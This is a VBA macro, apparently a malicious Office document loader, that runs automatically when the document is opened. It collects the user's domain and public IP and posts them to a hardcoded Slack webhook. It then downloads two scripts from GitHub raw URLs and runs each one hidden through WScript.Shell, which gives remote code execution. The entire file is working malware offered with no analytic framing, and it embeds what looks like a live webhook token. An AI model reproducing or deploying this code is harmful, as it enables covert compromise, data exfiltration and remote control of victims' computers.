Sub Auto_Open()
    VBA_stager
    
    'Wait 05 sec
    Application.Wait (Now + TimeValue("0:00:05"))
    
    powershell_stager
    
    'Wait 05 sec
    Application.Wait (Now + TimeValue("0:00:05"))
    
    powershell_rce
End Sub

Public Function VBA_stager()
    'Stage 1 send inital agent data
    Dim HTTP As Object
    Set HTTP = CreateObject("WinHttp.WinHttpRequest.5.1")
    Dim send_text As String

    
    'Get Computer username
    Set wshNetwork = CreateObject("WScript.Network")
    User = wshNetwork.UserDomain
    
    
    'Get Public Ip Address
    Dim HttpRequest As Object
 
    On Error Resume Next
    'Create the XMLHttpRequest object.
    Set HttpRequest = CreateObject("MSXML2.XMLHTTP")
 
    'Check if the object was created.
    If Err.Number <> 0 Then
        'Return error message.
        GetMyPublicIP = "Could not create the XMLHttpRequest object!"
        'Release the object and exit.
        Set HttpRequest = Nothing
        
    End If
    On Error GoTo 0
 
    'Create the request - no special parameters required.
    HttpRequest.Open "GET", "http://myip.dnsomatic.com", False
 
    'Send the request to the site.
    HttpRequest.send
 
    'Return the result of the request (the IP string).
    GetMyPublicIP = HttpRequest.responseText
    
    'Get Date
    Dim dtToday As Date
    dtToday = Date
    Dim URL$, body$
    send_text = "Agent Active VBA \n" & "User:" & User & "\n" & "Ip Public:" & GetMyPublicIP & "\n" & "Date:" & dtToday & "\n"
    body = send_text
    JBody = "{""text"":""" & body & """}"
    URL = "https://hooks.slack.com/services/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"
    HTTP.Open "POST", URL
    HTTP.setRequestHeader "Content-Type", "application/json"
    HTTP.send JBody
End Function

Public Function powershell_stager()
    'Get few data from endpoint powershell
    Dim stu1 As String
    stu1 = "https://raw.githubusercontent.com/Shivangx01b/test/main/delivery.txt"
    Set o1 = CreateObject("MSXML2.XMLHTTP")
    o1.Open "GET", stu1, False
    o1.send
    Dim stt1 As String
    stt1 = o1.responseText
    Set WshShell1 = CreateObject("WScript.Shell")
    WshShell1.Run (stt1), 0
    Set WshShell1 = Nothing
End Function

Public Function powershell_rce()
    'Bingo RCE
    Dim stu As String
    stu = "https://raw.githubusercontent.com/Shivangx01b/test/main/cov.txt"
    Set o = CreateObject("MSXML2.XMLHTTP")
    o.Open "GET", stu, False
    o.send
    Dim stt As String
    stt = o.responseText
    Set WshShell = CreateObject("WScript.Shell")
    WshShell.Run (stt), 0
    Set WshShell = Nothing
End Function
